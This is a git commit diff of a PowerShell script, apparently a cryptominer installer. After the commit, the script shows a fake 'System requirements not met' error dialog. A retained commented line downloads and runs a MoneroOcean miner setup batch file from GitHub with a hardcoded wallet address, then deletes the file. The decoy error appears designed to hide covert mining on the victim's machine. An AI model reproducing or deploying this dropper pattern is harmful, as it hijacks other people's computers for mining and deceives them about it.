4f8df570c2c68e5db1b682471d00fd490d4b7370
err4tik0 <98240038+err4tik0@users.noreply.github.com>
2022-04-22 21:38:26 -0400

    Update mnrinstl2.ps1

--- mnrinstl2.ps1
+++ mnrinstl2.ps1
@@ -1,11 +1,3 @@
-
-# function sb ($title, $msg) {     
-#     [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null 
-#     [Windows.Forms.MessageBox]::Show($title, [Windows.Forms.MessageBoxButtons]::OK, , $msg, [System.Windows.Forms.MessageBoxIcon]::Warning, [System.Windows.Forms.MessageBoxDefaultButton]::Button1, [System.Windows.Forms.MessageBoxOptions]::DefaultDesktopOnly) | Out-Null     
-# } 
-
-# sb( "ERROR", "System requirements not met.")
-
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 $ButtonType = [System.Windows.MessageBoxButton]::OK
 $MessageIcon = [System.Windows.MessageBoxImage]::Error
@@ -13,10 +5,6 @@ $MessageBody = "System requirements not met"
 $MessageTitle = "CONFIGURATION ERROR"
 
 $Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
-
-# Write-Host "Your choice is $Result"
-
-
 
 
 # $wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/err4tik0/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 44WW1etki7VDSXozBJkJft5rPNVvPQhSe4rSXM7DqRdT854qzdL2DnD6NieK4mxinyCy3Fuij8jjXZXzHmd66uGaVdzqewk; Remove-Item -Force $tempfile
